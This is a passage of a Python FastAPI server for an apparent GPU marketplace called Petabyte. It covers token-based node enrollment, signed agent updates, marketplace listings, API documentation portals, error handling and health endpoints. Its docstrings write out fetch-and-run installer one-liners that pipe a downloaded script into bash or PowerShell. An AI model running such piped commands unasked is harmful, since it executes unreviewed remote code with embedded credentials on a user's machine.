    api_url+api_key are given (token enrollment), prepend exports so the script needs NO env
    prefix and NO interactive input. Returns None if the installer isn't bundled."""
    path = _find_installer("install.sh")
    if not path:
        return None
    with open(path) as f:
        script = f.read()
    script = script.replace("__PETABYTE_RELEASE_PUBKEY_PEM__", _release_pubkey_pem())
    if api_url and api_key:
        head = ["#!/usr/bin/env bash",
                "# Petabyte token-bound enrollment installer. Do NOT share this URL — it enrols a worker.",
                "export PETABYTE_API_URL='%s'" % api_url,
                "export PETABYTE_API_KEY='%s'" % api_key]
        if price is not None:
            head.append("export PRICE_PER_HOUR='%s'" % price)
        script = "\n".join(head) + "\n" + script
    return script


def _render_install_ps1(*, api_url=None, api_key=None, price=None):
    """The Windows (WSL2) installer, ready to serve. With api_url+api_key, prepend $env: assigns
    so `irm … | iex` runs fully non-interactively. Returns None if not bundled."""
    path = _find_installer("install.ps1")
    if not path:
        return None
    with open(path) as f:
        script = f.read()
    if api_url and api_key:
        head = ["# Petabyte token-bound enrollment installer. Do NOT share this URL — it enrols a worker.",
                "$env:PETABYTE_API_URL='%s'" % api_url,
                "$env:PETABYTE_API_KEY='%s'" % api_key]
        if price is not None:
            head.append("$env:PRICE_PER_HOUR='%s'" % price)
        script = "\n".join(head) + "\n" + script
    return script


@app.get("/install.sh")
def install_script():
    """Serve the Linux node installer so the one-liner needs no extra hosting.

    The pinned release PUBLIC key is substituted into the script at download time (the seller
    already trusts this API over TLS for the installer). update.sh then verifies every future
    agent bundle against it; unset -> the placeholder resolves empty and auto-update stays
    fail-closed (refused)."""
    script = _render_install_sh()
    if script is None:
        raise HTTPException(status_code=404, detail="installer not bundled")
    return Response(content=script, media_type="text/x-shellscript")

@app.get("/install.ps1")
def install_script_ps1():
    """Serve the Windows (WSL2) installer for the PowerShell one-liner."""
    script = _render_install_ps1()
    if script is None:
        raise HTTPException(status_code=404, detail="installer not bundled")
    return Response(content=script, media_type="text/plain")


def _base_url(request: Request) -> str:
    """This server's public base URL (scheme+host), no trailing slash — so a token-bound node
    registers back to wherever the seller reached us (prod, preview, self-host), not a constant."""
    return str(request.base_url).rstrip("/")


def _mint_node_key_for(db: Session, user) -> str:
    """Mint a fresh node-scoped API key for a seller (used by token enrollment; each fetch
    yields its own independently-revocable worker key)."""
    api_key, jti = gen_secure_api_key(user.username, 90, ["node", "jobs"])
    record_issued_key(db, user.id, jti, "one-line installer", ["node", "jobs"], 90)
    return api_key


# NOTE: the ".ps1" route MUST be declared before the bare "/i/{token}" route — the bare
# param matches ".ps1" too (dots are legal in a path segment), so the specific one has to win.
@app.get("/i/{token}.ps1")
def install_by_token_ps1(token: str, request: Request, db: Session = Depends(get_db)):
    """One-line, non-interactive enrollment (Windows): `irm <server>/i/<token>.ps1 | iex`."""
    row = resolve_install_token(db, token)
    user = get_user_by_id(db, row.user_id) if row else None
    if user is None:
        raise HTTPException(status_code=404, detail="This install link is invalid or has expired.")
    key = _mint_node_key_for(db, user)
    price = None if row.price is None else format(row.price, "f")
    script = _render_install_ps1(api_url=_base_url(request), api_key=key, price=price)
    if script is None:
        raise HTTPException(status_code=404, detail="installer not bundled")
    return Response(content=script, media_type="text/plain")


@app.get("/i/{token}")
def install_by_token(token: str, request: Request, db: Session = Depends(get_db)):
    """One-line, non-interactive enrollment (Linux/macOS):

        curl -fsSL <server>/i/<token> | bash

    Resolves the enrollment token, mints a fresh node key, and returns install.sh with the key,
    this server's URL and (optional) pinned price already baked in — the node installs, benchmarks
    and comes online with nothing to type. Each fetch enrols a distinct worker, so one token can
    bring up a whole rig. Invalid/expired tokens 404."""
    row = resolve_install_token(db, token)
    user = get_user_by_id(db, row.user_id) if row else None
    if user is None:
        raise HTTPException(status_code=404, detail="This install link is invalid or has expired.")
    key = _mint_node_key_for(db, user)
    price = None if row.price is None else format(row.price, "f")
    script = _render_install_sh(api_url=_base_url(request), api_key=key, price=price)
    if script is None:
        raise HTTPException(status_code=404, detail="installer not bundled")
    return Response(content=script, media_type="text/x-shellscript")


@app.get("/manage.ps1")
def manage_script_ps1():
    """Serve the Windows pause/resume/uninstall manager."""
    path = _find_installer("manage.ps1")
    if not path:
        raise HTTPException(status_code=404, detail="not bundled")
    with open(path) as f:
        return Response(content=f.read(), media_type="text/plain")


@app.get("/agent.tar.gz")
def agent_tarball():
    """Serve the agent code as a tarball, built at deploy time.

    This is what lets the node installer work WITHOUT cloning the GitHub repo — so it
    keeps working when the repo is private, and hosts never need any GitHub credential.
    The installer downloads this from the same server it already talks to."""
    here = os.path.dirname(__file__)
    for cand in (os.path.join(here, "installers", "agent.tar.gz"),
                 os.path.join(here, "..", "lumaris_agent.tar.gz")):
        if os.path.exists(cand):
            with open(cand, "rb") as f:
                return Response(content=f.read(), media_type="application/gzip")
    raise HTTPException(status_code=404, detail="agent bundle not built on this host")


@app.get("/agent.tar.gz.sig")
def agent_tarball_sig():
    """Serve the detached Ed25519 signature of agent.tar.gz (produced at deploy time by
    scripts/sign_release.py with the offline release key). The node's update.sh verifies the
    downloaded bundle against this before applying it — SIGNED updates only, fail-closed. 404
    when unsigned (then update.sh refuses to auto-update rather than trusting TLS alone)."""
    here = os.path.dirname(__file__)
    for cand in (os.path.join(here, "installers", "agent.tar.gz.sig"),
                 os.path.join(here, "..", "lumaris_agent.tar.gz.sig")):
        if os.path.exists(cand):
            with open(cand, "rb") as f:
                return Response(content=f.read(), media_type="application/octet-stream")
    raise HTTPException(status_code=404, detail="agent bundle signature not present on this host")


@app.get("/uninstall.sh")
def uninstall_script_sh():
    """Serve the Linux node uninstaller."""
    path = _find_installer("uninstall.sh")
    if not path:
        raise HTTPException(status_code=404, detail="not bundled")
    with open(path) as f:
        return Response(content=f.read(), media_type="text/plain")


_STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
_STATIC_ALLOW = {
    "petabyte-logo.png": "image/png",
    "petabyte-mark-180.png": "image/png",
    "favicon.png": "image/png",
    # BIMI brand indicator (SVG Tiny PS). Referenced by the default._bimi TXT record so
    # mailbox providers can show the Petabyte mark as the sender avatar. See
    # docs/EMAIL_BIMI_SETUP.md.
    "petabyte-bimi.svg": "image/svg+xml",
}

@app.get("/static/{fname}")
def static_asset(fname: str):
    """Serve bundled brand assets (whitelisted; no path traversal)."""
    media = _STATIC_ALLOW.get(fname)
    if not media:
        raise HTTPException(status_code=404, detail="not found")
    try:
        with open(os.path.join(_STATIC_DIR, fname), "rb") as f:
            return Response(content=f.read(), media_type=media,
                            headers={"Cache-Control": "public, max-age=86400"})
    except OSError:
        raise HTTPException(status_code=404, detail="not found")

@app.get("/favicon.ico")
def favicon():
    try:
        with open(os.path.join(_STATIC_DIR, "favicon.png"), "rb") as f:
            return Response(content=f.read(), media_type="image/png",
                            headers={"Cache-Control": "public, max-age=86400"})
    except OSError:
        raise HTTPException(status_code=404, detail="not found")

@app.get("/marketplace/specs/{public_id}", tags=["marketplace"])
def public_spec_detail(public_id: str, db: Session = Depends(get_db)):
    """Everything a buyer needs to judge one node before booking it.
    Addressed by an opaque handle — the internal id is never public, so listings
    can't be enumerated and our volume isn't leaked."""
    from db import get_spec_by_public_id
    spec = get_spec_by_public_id(db, public_id)
    if not spec or not spec.attested:
        raise HTTPException(status_code=404, detail="GPU not found")
    owner = get_user_by_id(db, spec.user_id)
    total = (spec.jobs_completed or 0) + (spec.jobs_failed or 0)
    _rep = compute_reputation(db, spec)
    ref = cloud_reference_for(spec.gpu_model)
    return {
        "id": spec.public_id, "gpu_model": spec.gpu_model or "CPU",
        "gpu_count": spec.gpu_count or 0, "vram_gb": spec.vram_gb or 0,
        "cpu": spec.cpu, "ram_gb": spec.ram,
        "price_per_hour": spec.price_per_hour, "cloud_reference": ref,
        "savings_pct": (round((1 - float(spec.price_per_hour) / ref) * 100)
                        if ref and float(spec.price_per_hour) < ref else None),
        "auto_price": bool(spec.auto_price),
        "region": spec.region, "region_verified": bool(spec.region_verified),
        "confidential": bool(spec.confidential),
        "online": spec_is_live(spec),
        "available_units": spec.available_units, "total_units": spec.total_units,
        "reputation_score": _rep["score"] if isinstance(_rep, dict) else _rep,
        "jobs_completed": spec.jobs_completed, "jobs_failed": spec.jobs_failed,
        "success_rate": round(100.0 * spec.jobs_completed / total, 1) if total else None,
        "can_accept_paid_jobs": bool(owner and owner.can_accept_paid_jobs),
        "trust": trust_level_for(spec),
        "verification": {
            # Honest names: an agent signature proves a keyholder on the node
            # claims this hardware — it is NOT vendor hardware attestation.
            "agent_attested": bool(spec.attested),
            "method": "Ed25519-signed hardware report from the Petabyte agent",
            "benchmark_verified": bool(spec.benchmark_tokens_sec),
            "region_verified": bool(spec.region_verified),
            "confidential_computing_pilot": bool(spec.confidential),
            "hardware_attested": False,   # requires the real vendor TEE chain (stub.md #3)
            "limits": "Agent attestation binds results to a device key; it cannot prove "
                      "the silicon itself. Vendor TEE verification (NVIDIA NRAS / AMD "
                      "SEV-SNP / Intel TDX) is not connected yet.",
        },
        "protection": {
            "escrow": "Funds are held in escrow for the rental and released on completion.",
            "node_failure": "If the node stops responding, your machine fails over to another node at the same address, or you are refunded.",
            "billing": "Billed for the hours you hold the machine; unused prepay is refunded when you stop.",
        },
    }


@app.get("/marketplace/specs", tags=["marketplace"])
def public_specs(db: Session = Depends(get_db),
                 gpu: Optional[str] = None, region: Optional[str] = None,
                 min_vram: int = 0, max_price: Optional[float] = None,
                 confidential: Optional[bool] = None, sort: str = "price",
                 limit: int = Query(200, ge=1, le=200), offset: int = Query(0, ge=0)):
    """Public, read-only inventory with search/filter (no auth, limited fields).

    Filtering, sorting and pagination run in SQL (indexed columns + a JOIN to the owner) so the
    handler never loads the whole table into Python — it fetches only the matching page. `count`
    is the TOTAL number of matches; `specs` is the requested page (`limit`/`offset`). Only the
    page is enriched with the (pure) reputation/trust/cloud fields."""
    from db import SellerSpec, User
    # "live" = online with a fresh heartbeat, expressed in SQL (naive-UTC cutoff matches stored
    # last_seen and spec_is_live()). Owner must be allowed to take paid jobs (INNER JOIN).
    cutoff = (datetime.now(timezone.utc) - timedelta(seconds=HEARTBEAT_TIMEOUT_S)).replace(tzinfo=None)
    q = (db.query(SellerSpec).join(User, User.id == SellerSpec.user_id)
         .filter(SellerSpec.attested == True,                        # noqa: E712
                 SellerSpec.status == "online",
                 SellerSpec.last_seen.isnot(None),
                 SellerSpec.last_seen >= cutoff,
                 SellerSpec.available_units >= 1,
                 User.can_accept_paid_jobs == True))                 # noqa: E712
    if gpu:
        needle = gpu.replace("%", "").replace("_", "")               # GPU names carry no LIKE wildcards
        q = q.filter(SellerSpec.gpu_model.ilike(f"%{needle}%"))
    if region:
        q = q.filter(func.lower(SellerSpec.region) == region.lower())
    if min_vram:
        q = q.filter(func.coalesce(SellerSpec.vram_gb, 0) >= min_vram)
    if max_price is not None:
        q = q.filter(SellerSpec.price_per_hour <= max_price)
    if confidential is not None:
        q = q.filter(SellerSpec.confidential == confidential)

    total = q.count()

    if sort == "vram":
        q = q.order_by(func.coalesce(SellerSpec.vram_gb, 0).desc(), SellerSpec.id.asc())
    elif sort == "rep":
        # The reputation score (0..100) is a PURE function of stored columns, so it can be
        # ordered on in SQL — same formula as db.compute_reputation (clamp omitted: irrelevant
        # to ordering). Lets us paginate a reputation-sorted page without loading every row.
        _done = func.coalesce(SellerSpec.jobs_completed, 0)
        _failed = func.coalesce(SellerSpec.jobs_failed, 0)
        _tot = _done + _failed
        rep_expr = (60.0
                    + case((_tot > 0, 30.0 * cast(_done, Float) / cast(_tot, Float)
                            - 15.0 * cast(_failed, Float) / cast(_tot, Float)), else_=0.0)
                    + case((and_(SellerSpec.benchmark_tokens_sec.isnot(None),
                                 SellerSpec.benchmark_tokens_sec != 0), 5.0), else_=0.0)
                    - 25.0 * func.coalesce(SellerSpec.fraud_count, 0))
        q = q.order_by(rep_expr.desc(), SellerSpec.id.asc())
    else:   # price (default)
        q = q.order_by(SellerSpec.price_per_hour.asc(), SellerSpec.id.asc())

    page = q.limit(limit).offset(offset).all()

    out = []
    for spec in page:      # only the page is enriched (reputation is a cheap pure computation)
        total_j = (spec.jobs_completed or 0) + (spec.jobs_failed or 0)
        _rep = compute_reputation(db, spec)
        out.append({"id": spec.public_id,
                    "gpu_model": spec.gpu_model or "CPU",
                    "gpu_count": spec.gpu_count or 0, "vram_gb": spec.vram_gb or 0,
                    "cpu": spec.cpu, "ram_gb": spec.ram,
                    "price_per_hour": spec.price_per_hour,
                    "cloud_reference": cloud_reference_for(spec.gpu_model),
                    "auto_price": bool(spec.auto_price),
                    "region": spec.region, "region_verified": bool(spec.region_verified),
                    "confidential": bool(spec.confidential),
                    "reputation_score": _rep["score"] if isinstance(_rep, dict) else _rep,
                    "available_units": spec.available_units,
                    "total_units": spec.total_units,
                    "attested": bool(spec.attested),
                    "trust": trust_level_for(spec),
                    "jobs_completed": spec.jobs_completed, "jobs_failed": spec.jobs_failed,
                    "success_rate": round(100.0 * spec.jobs_completed / total_j, 1) if total_j else None})
    return {"specs": out, "count": total, "limit": limit, "offset": offset,
            "aws_reference": float(AWS_REFERENCE_PRICE)}


@app.get("/docs", include_in_schema=False)
def api_reference():
    """Interactive API portal (Scalar) generated from our OpenAPI schema — endpoint
    navigation, request/response examples, and a live 'Test Request' console.
    Falls back to the Scalar CDN if the package isn't installed, so a missing
    dependency can never take the docs down."""
    try:
        from scalar_fastapi import get_scalar_api_reference
        return get_scalar_api_reference(
            openapi_url=app.openapi_url,
            title="Petabyte API",
            scalar_theme="deepSpace",
        )
    except Exception:
        return HTMLResponse("""<!doctype html><html><head><meta charset="utf-8">
<title>Petabyte API</title><meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="/static/petabyte-logo.png"></head><body style="margin:0">
<script id="api-reference" data-url="/openapi.json" data-configuration='{"theme":"deepSpace"}'></script>
<script src="https://cdn.jsdelivr.net/npm/@scalar/api-reference"></script>
</body></html>""")


# ------------------- SPLIT API PORTALS: /data (buy data) vs /devs (build compute) -------------------
# Two products, two Scalar reference portals, each backed by a TAG-FILTERED OpenAPI spec so the two
# never overlap: an endpoint documented under /data can never appear under /devs, and vice-versa.
# The `data` tag is the buy-data product; the compute/build tags are the developer product. The
# filter also EXCLUDES the data tag from /devs explicitly, so even a future double-tagged endpoint
# stays out of the developer portal (data wins). This mirrors the key model: data keys carry the
# `data` scope; compute/agent keys carry `node`/`jobs` — a key for one product is refused by the other.
_DATA_PORTAL_TAGS = {"data"}
_DEV_PORTAL_TAGS = {"compute", "marketplace", "seller", "wallet", "account"}
_OPENAPI_METHODS = {"get", "post", "put", "patch", "delete", "options", "head", "trace"}


def _portal_openapi(*, include: set, exclude: set, title: str, description: str,
                    exclude_path_prefixes: tuple = ()) -> dict:
    """A copy of the app's OpenAPI schema keeping only operations whose tags intersect `include`
    and DON'T intersect `exclude` — so /data and /devs render disjoint, product-scoped references.
    `exclude_path_prefixes` drops whole paths (e.g. operator-only /admin/) regardless of tag."""
    spec = copy.deepcopy(app.openapi())
    spec["info"] = {**spec.get("info", {}), "title": title, "description": description}
    kept_paths = {}
    for path, ops in (spec.get("paths") or {}).items():
        if any(path.startswith(p) for p in exclude_path_prefixes):
            continue
        kept_ops, keep = {}, {}
        for method, op in ops.items():
            if method.lower() not in _OPENAPI_METHODS:
                keep[method] = op                     # path-level shared keys (parameters, summary)
                continue
            tags = set((op or {}).get("tags") or [])
            if tags & exclude:
                continue
            if include and not (tags & include):
                continue
            kept_ops[method] = op
        if kept_ops:
            kept_paths[path] = {**keep, **kept_ops}
    spec["paths"] = kept_paths
    shown = (include - exclude) if include else set()
    if shown:
        spec["tags"] = [t for t in spec.get("tags", []) if t.get("name") in shown]
    return spec


def _scalar_portal(spec_url: str, title: str) -> HTMLResponse:
    """A standalone Scalar API-reference page bound to one filtered spec (CDN bundle; the CSP
    already allows cdn.jsdelivr.net scripts and same-origin spec fetch)."""
    return HTMLResponse(f"""<!doctype html><html><head><meta charset="utf-8">
<title>{title}</title><meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="/static/petabyte-logo.png"></head><body style="margin:0">
<script id="api-reference" data-url="{spec_url}" data-configuration='{{"theme":"deepSpace"}}'></script>
<script src="https://cdn.jsdelivr.net/npm/@scalar/api-reference"></script>
</body></html>""")


def _data_portal_description() -> str:
    free = DATA_API_FREE_CALLS_MONTH
    per_call = f"{DATA_API_PRICE_PER_1K / 1000.0:.4f}".rstrip("0").rstrip(".")
    sandbox = DATA_API_SANDBOX_KEY or "(sandbox key disabled)"
    return f"""# Petabyte Data API

Programmatic access to Petabyte's live GPU-marketplace data: a benchmark-anchored **price index**,
**price history**, **cloud-savings**, **live supply**, buyer-side **demand**, **workload mix**,
**templates bought**, and the GPU-**authenticity** dataset. REST + JSON, one key.

> This is the **buy-data** product. To rent GPUs and run workloads, see the **[Developer API](/devs)**.
> The two are separate: an endpoint here is never part of the Developer API, and the keys don't cross over.

## Buying data — pay as you go

No subscription, no seat licence. You pay per call, only past a free monthly trial.

1. **Try it free, no signup.** `GET /api/v1/data/sample` returns example payloads (keyless), so you can
   see every response shape first. Or hit the **real** endpoints free & unmetered with the published
   **sandbox key**: `X-API-KEY: {sandbox}`.
2. **Get a key.** Sign in and mint a **`data`-scoped** key on the [keys page](/keys).
3. **Fund your wallet.** Fees are debited from your wallet balance ([add funds](/wallet)).
4. **Call it.** Every response carries a `usage` receipt — whether the call was billed and how much.

## Pricing

* Each account gets a free monthly trial of **{free} call-units**.
* Beyond the trial, a call costs **${per_call} × the endpoint's price weight**, debited from your wallet.
* **Weights** — commodity datasets (`gpu-prices`, `market`, `savings`, `availability`) = 1; history &
  `workloads` cost more; `demand`, `templates`, `benchmarks` are premium. Premium data, premium price.
* A call your balance can't cover is refused with **`402`** — never silently given away.
* `GET /api/v1/data/usage` is always free and reports your month's calls and spend.

## Authentication & scope

Send your key in the **`X-API-KEY`** header. Data keys carry the **`data` scope** — a different scope
from the compute/agent keys (`node`, `jobs`) used by the [Developer API](/devs). This API is gated to
the `data` scope, so a `node`/`jobs` key is **refused here (403)**. And the two references share **no
endpoint** — nothing in the Data API is part of the Developer API. One product, one scope.

## Honesty

Every dataset is **aggregate and anonymized** — no seller, buyer, node or spec identity is ever
returned. Sandbox and demo activity is excluded, so you get real demand, not inflated numbers. When
there is nothing to report, you get an **empty** result — never fabricated data."""


def _dev_portal_description() -> str:
    return """# Petabyte Developer API

Build on the compute exchange: browse verified GPUs, **rent by the hour with escrow**, deploy
workloads and templates, run jobs, manage your wallet and payouts, and drive the seller agent.

> This is the **build-compute** product. To buy market data, see the **[Data API](/data)**.
> The two are separate: no data endpoint appears here, and the keys don't cross over.

## Keys & scopes

Mint a scoped key on the [keys page](/keys) and send it as **`X-API-KEY`**. Compute/agent keys carry
the **`node`** and **`jobs`** scopes — a different scope from the **`data`** key used by the
[Data API](/data), which is gated to `data` keys (a `node`/`jobs` key is refused there, 403). The two
products are documented separately and share **no endpoint**. Pick the product, pick the scope.

## Distributed compute (one job across many GPUs)

`POST /distributed` splits a single job across up to 100 GPUs that live on **different machines**
but form **one cluster over the VPN** (torchrun/NCCL). The platform:

* gang-schedules N nodes across **distinct providers** — never two ranks on the same PC;
* **escrows all N up-front, all-or-nothing** — a cluster that can't fully form is refused and
  refunded (you're charged nothing for a half-formed cluster);
* assigns ranks `0..N-1` and coordinates **rendezvous**: rank 0 registers its VPN address at
  `POST /jobs/rendezvous`, the other ranks poll `GET /jobs/rendezvous/{job_id}` to join, then each
  node runs your container under `torchrun --nnodes=N --node_rank=<rank>`;
* completes when every rank finishes; a dead rank fails the whole run (gang semantics).

On each node the agent **executes** its rank: it registers its own VPN address, resolves the
master, launches your container under `torchrun` wired to `--master_addr/--node_rank/--nnodes`,
and reports a **signed result** — the same attested-key path every job uses, so a distributed run
is bound to real hardware. The cluster is marked complete only once **every** rank's signed result
arrives.

**Validate your cluster first (self-test).** Pass `selftest: true` (no `image`/`command` needed) and
each rank runs a built-in **cross-process all-reduce** instead of a container: the ranks actually
talk to each other over the mesh and every rank must converge on the correct global reduction. It's
the "does my N-node cluster really communicate and reduce correctly?" smoke test to run before
committing to a long, expensive training job.

Track the cluster at `GET /jobs/manifest/{job_id}` (per-rank status + the master address).

**Private network (VPN).** Pass `vpn: true` to `/distributed` (or `/request_vm`) and the buyer gets
a WireGuard tunnel into the private cluster network: `GET /jobs/{job_id}/vpn_config` (or
`/vpn_config/{booking_id}`) returns a ready-to-use client config. A fresh keypair is minted per
download; the server never keeps the client private key.

## Bring your own scheduler — Petabyte is just another provider

Big-corp, academic and government workloads already run on **Slurm, MPI, Ray, or Kubernetes** and
won't rewrite their stack. Adopting Petabyte is adding a **node pool**, not an infra change: every
rank registers its VPN address, and Petabyte hands the cluster back as the artifacts your launcher
already consumes.

* `GET /jobs/{job_id}/hostfile` → an **MPI/torchrun hostfile** (`<host> slots=<gpus>`). Run it with
  your existing `mpirun --hostfile hostfile -np <N> ...` — zero code change.
* `GET /jobs/{job_id}/cluster` → the full node list + **ready-to-run launch commands** for
  `mpirun`, `torchrun`, `ray`, and `srun`, plus the master address.

Integration patterns (Petabyte = an extra provider, your control plane stays put):
* **Slurm** — cloud-burst: point your `ResumeProgram`/`SuspendProgram` at `POST /distributed` so
  `slurmctld` elastically provisions Petabyte nodes that join your existing controller.
* **MPI / OpenMPI** — feed the `hostfile` straight into `mpirun`.
* **Ray** — `ray start --head` on rank 0, `ray start --address=<master>` on the rest (both printed
  by `/cluster`).
* **PyTorch** — `torchrun --rdzv_backend=static --master_addr=<master>` from `/cluster`.
* **Kubernetes** — join the Petabyte nodes as autoscaled GPU workers behind your scheduler.

## Money model

Rentals are **prepaid into escrow** before any work runs, and released to the seller as the work
completes (or refunded to you if a node drops). Fund your wallet, book compute, and every state
transition is visible on your transaction."""


@app.get("/data/openapi.json", include_in_schema=False)
def data_portal_openapi():
    """OpenAPI for the buy-data product only (the `data` tag)."""
    return _portal_openapi(include=_DATA_PORTAL_TAGS, exclude=set(),
                           title="Petabyte Data API", description=_data_portal_description())


@app.get("/devs/openapi.json", include_in_schema=False)
def devs_portal_openapi():
    """OpenAPI for the build-compute product only — the developer tags, with the data product
    explicitly EXCLUDED so the two portals never share an endpoint."""
    return _portal_openapi(include=_DEV_PORTAL_TAGS, exclude=_DATA_PORTAL_TAGS | {"admin"},
                           title="Petabyte Developer API", description=_dev_portal_description(),
                           exclude_path_prefixes=("/admin/", "/internal/"))


@app.get("/data", include_in_schema=False)
def data_portal():
    """Scalar reference for the buy-data API — how to buy data, priced and metered."""
    return _scalar_portal("/data/openapi.json", "Petabyte Data API")


@app.get("/devs", include_in_schema=False)
def devs_portal():
    """Scalar reference for the build-compute developer API (rent GPUs, run jobs)."""
    return _scalar_portal("/devs/openapi.json", "Petabyte Developer API")


# ------------------- WIKI: new-user guide, rendered in the SAME Scalar docs environment -------------------
# The source of truth is the Markdown in wiki/ (GitHub-readable). Here we assemble those pages into one
# OpenAPI `info.description` — which Scalar renders as rich Markdown with a heading-driven sidebar — and
# serve it through the exact same Scalar shell (_scalar_portal) as /docs, /data and /devs.
_WIKI_ORDER = ["index", "overview", "getting-started", "buyers", "sellers", "cli", "models",
               "storage", "teams-and-security", "payments-and-trust", "api", "self-hosting", "glossary"]


def _wiki_markdown() -> str:
    base = os.path.join(os.path.dirname(__file__), "..", "wiki")
    parts = []
    for name in _WIKI_ORDER:
        p = os.path.join(base, name + ".md")
        if os.path.exists(p):
            try:
                parts.append(open(p, encoding="utf-8").read().strip())
            except Exception:  # noqa: BLE001
                continue
    return "\n\n---\n\n".join(parts) or "# Petabyte Wiki\n\nDocumentation is being prepared."


@app.get("/wiki/openapi.json", include_in_schema=False)
def wiki_openapi():
    """A minimal OpenAPI doc whose description IS the wiki — so Scalar renders it like the API docs."""
    return JSONResponse({"openapi": "3.1.0", "paths": {}, "tags": [],
                         "info": {"title": "Petabyte — Wiki & Guide", "version": "1.0",
                                  "description": _wiki_markdown()}})


@app.get("/wiki", include_in_schema=False)
def wiki_portal():
    """The new-user wiki, rendered in the same Scalar docs environment as the API reference."""
    return _scalar_portal("/wiki/openapi.json", "Petabyte — Wiki & Guide")


@app.exception_handler(BookingsPaused)
async def _bookings_paused_handler(request: Request, exc: BookingsPaused):
    """The kill switch is on. 503 + Retry-After: honest, and clients back off."""
    return JSONResponse(
        status_code=503,
        headers={"Retry-After": "300"},
        content={"error": {"code": "BOOKINGS_PAUSED",
                           "message": str(exc) or "New bookings are temporarily paused.",
                           "request_id": getattr(request.state, "request_id", None)},
                 "detail": str(exc)})


@app.exception_handler(404)
async def not_found(request: Request, exc):
    """Humans browsing get a page they can navigate out of.

    Careful: an endpoint that deliberately raises 404 with a structured detail (e.g.
    GPU_NOT_FOUND, which carries a code, a message and a `next` action) must NOT be
    swallowed by this handler — hand those back to the structured error handler."""
    detail = getattr(exc, "detail", None)
    if isinstance(detail, dict):
        return await _structured_http_error(request, exc)
    accepts_html = "text/html" in (request.headers.get("accept") or "")
    if accepts_html and not request.url.path.startswith(("/api/", "/v1/")):
        return HTMLResponse(NOTFOUND_HTML, status_code=404)
    return JSONResponse({"error": {"code": "NOT_FOUND",
                                   "message": "That endpoint does not exist."}},
                        status_code=404)


@app.exception_handler(HTTPException)
async def _structured_http_error(request: Request, exc: HTTPException):
    """Every error is machine-readable: a stable code, a human message, and the
    request id to quote at support. Raw Python exception text never reaches a user."""
    rid = getattr(request.state, "request_id", None)
    detail = exc.detail
    code = None
    nxt = None
    if isinstance(detail, dict):
        code = detail.get("code")
        message = detail.get("message", "Request failed.")
        nxt = detail.get("next")          # where the user can actually go to fix it
    else:
        message = str(detail)
    if not code:
        code = {
            400: "INVALID_REQUEST", 401: "NOT_AUTHENTICATED", 402: "INSUFFICIENT_BALANCE",
            403: "NOT_PERMITTED", 404: "NOT_FOUND", 409: "CONFLICT",
            422: "VALIDATION_FAILED", 429: "RATE_LIMIT_EXCEEDED",
        }.get(exc.status_code, "REQUEST_FAILED")
    return JSONResponse(
        status_code=exc.status_code,
        headers=getattr(exc, "headers", None) or {},
        content={"error": {k: v for k, v in
                           {"code": code, "message": message,
                            "next": nxt, "request_id": rid}.items() if v},
                 "detail": message},   # keep `detail` so existing clients don't break
    )


@app.exception_handler(Exception)
async def _unhandled_error(request: Request, exc: Exception):
    """Never leak a stack trace or internal exception text to a caller."""
    rid = getattr(request.state, "request_id", None)
    logger.exception("unhandled request_id=%s path=%s", rid, _safe_path(request))
    return JSONResponse(
        status_code=500,
        content={"error": {"code": "INTERNAL_ERROR",
                           "message": "Something went wrong on our side.",
                           "request_id": rid},
                 "detail": "Internal server error"},
    )


@app.get("/health/live", include_in_schema=False)
def health_live():
    """Liveness: is the process up? Deliberately touches nothing else."""
    return {"status": "alive"}


@app.get("/health/ready", include_in_schema=False)
def health_ready(db: Session = Depends(get_db)):
    """Readiness: can this instance serve traffic? Checks the DB, and reports
    maintenance freshness — a reaper that died silently is a money bug (VMs never
    expire, dead nodes stay listed, bookings never settle). Alert on
    `maintenance.stale == true`."""
    try:
        db.execute(text("SELECT 1"))
    except Exception:
        logger.exception("readiness: database unreachable")
        return JSONResponse(status_code=503,
                            content={"status": "not_ready", "database": "unreachable"})
    last = _maintenance["last_success"]
    age = (time.time() - last) if last else None
    # stale = no successful cycle in 10x the interval. Only meaningful on the
    # process that actually holds the maintenance lock.
    stale = bool(_maintenance["holder"] and (last is None or age > REAPER_INTERVAL_S * 10))
    return {"status": "ready", "database": "ok",
            "maintenance": {"enabled": not REAPER_DISABLED,
                            "is_leader": _maintenance["holder"],
                            "last_success_age_s": round(age, 1) if age else None,
                            "failures": _maintenance["failures"],
                            "stale": stale}}


@app.get("/healthz")
def healthz():
    return {"status": "ok"}


@app.get("/readyz")
def readyz(db: Session = Depends(get_db)):
    try:
        db.execute(text("SELECT 1"))
        return {"status": "ready"}
    except Exception:
        raise HTTPException(status_code=503, detail="database unavailable")


@app.get("/health/observability", include_in_schema=False)
def health_observability():
    """Health of the telemetry integrations (tracing/metrics/logging/redis). Never fails
    the app — an operator reads this to confirm telemetry is flowing (or degraded)."""
    h = obsmod.health()
    try:
        import redis_client
        h["redis"] = redis_client.health()
    except Exception:  # noqa: BLE001
        h["redis"] = {"configured": False}
    return h


def _metrics_authorized(request: Request) -> bool:
    """Prometheus scrape auth: allow a valid bearer token (PROMETHEUS_METRICS_TOKEN), or
    a caller on the trusted/loopback network (Prometheus scrapes over the private net).
    The endpoint is never anonymous-public when a token is configured."""
    token = os.getenv("PROMETHEUS_METRICS_TOKEN", "").strip()
    if token:
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer ") and secrets.compare_digest(auth[7:], token):
            return True
        # a token is configured -> token is required (no silent loopback bypass)
        return False
    # no token configured -> restrict to loopback / trusted proxies only
    ip = _client_ip(request) or ""
    return ip in ("127.0.0.1", "::1") or ip in TRUSTED_PROXIES


# Prometheus scrape endpoint. Path is configurable (defaults to /internal/metrics — NOT
# /metrics, which already serves the investor HTML dashboard). Protected: money-adjacent
# counters must not be world-readable.
_PROM_PATH = os.getenv("PROMETHEUS_METRICS_PATH", "/internal/metrics")


@app.get(_PROM_PATH, include_in_schema=False)
def prometheus_metrics(request: Request):
    if not _metrics_authorized(request):
        raise HTTPException(status_code=403, detail="metrics access denied")
    body, ctype = obsmod.metrics_response()
    return Response(content=body, media_type=ctype)


def _norm_country(*values) -> str:
    """Normalize a country label: strip → uppercase → first two chars of the FIRST non-empty
    source, else 'unknown'. Normalizing the source first (not the fallback) means a missing
    country becomes 'unknown', never 'UN' (which is what truncating the word 'unknown' gave)."""
    for v in values:
        if v:
            cc = str(v).strip().upper()[:2]
            if cc:
                return cc
    return "unknown"


def _marketplace_metrics():
